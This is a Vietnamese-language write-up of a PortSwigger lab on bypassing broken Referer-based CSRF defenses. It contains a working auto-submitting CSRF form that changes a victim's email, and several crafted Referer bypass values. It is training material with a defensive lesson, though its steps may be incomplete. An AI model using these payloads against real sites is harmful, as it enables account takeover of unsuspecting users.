![[csrf-broken-referer.png]]
-mô tả lab: chức năng đổi email có check `Referer` bằng cách parse URL rất ẩu. Mình bypass bằng query string.

> [!NOTE]
> -link lab: https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-broken-referer-validation

### hướng giải
- [ ] mình đổi email với `Referer` đúng domain lab thì chạy bình thường
- [ ] mình thử `Referer: https://evil.com` thì bị chặn `Invalid referer header`
- [ ] mình thử `Referer: https://LAB-ID.web-security-academy.net.evil.com` vẫn bị chặn
- [ ] mình thử nhét domain lab vào query: `Referer: https://evil.com/?LAB-ID.web-security-academy.net`, sau đó quan sát gói tin trả về, mình thấy nó cho qua
- [ ] => nên mình đoán server chỉ check chuỗi domain có xuất hiện đâu đó trong header, không parse host chuẩn. Vậy mình nhét domain xịn vào query của domain đểu là xong

### giải
-bước 1: mình tạo file exploit, host trên exploit-server của lab (domain `exploit-LAB...`), form đổi email bình thường:
```html
<html>
<body>
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="pwned@evil.com" />
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```
-khi victim click từ trang `https://exploit-LAB-ID.web-security-academy.net/exploit?LAB-ID.web-security-academy.net` thì trình duyệt gửi:
```
Referer: https://exploit-LAB-ID.web-security-academy.net/exploit?LAB-ID.web-security-academy.net
```
![[csrf-broken-referer-bypass.png]]
-sau khi quan sát gói tin này, mình thấy chuỗi domain lab xuất hiện trong query nên server tưởng là hợp lệ, email đổi luôn.

-biến thể khác mình hay thử nếu cách trên fail:
- `https://evil.com/LAB-ID.web-security-academy.net` (path)
- `https://evil.com#LAB-ID.web-security-academy.net` (fragment, nhưng fragment không gửi lên server nên ít dùng được ở đây)

-bước 2: `Deliver exploit to victim`, đợi victim xem là solve.

> [!NOTE]
> -bài học của mình: validate Referer bằng `contains` thì chết, phải parse URL lấy đúng host ra so sánh.
